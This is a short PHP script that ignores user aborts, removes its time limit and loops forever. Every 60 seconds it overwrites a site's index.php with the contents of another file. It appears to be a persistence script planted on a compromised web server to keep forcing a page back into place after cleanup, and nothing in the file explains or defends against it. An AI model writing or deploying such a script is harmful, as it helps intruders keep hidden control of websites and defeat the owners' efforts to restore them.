<?php
ignore_user_abort();
set_time_limit(0);
$filename = 'D:/fcfcg61gbk/index.php';
do {
sleep(60);
file_put_contents($filename,file_get_contents('D:/wwwroot/fcfcg/wwwroot/tejiafang/index.html.php'));
}while (1);
?>
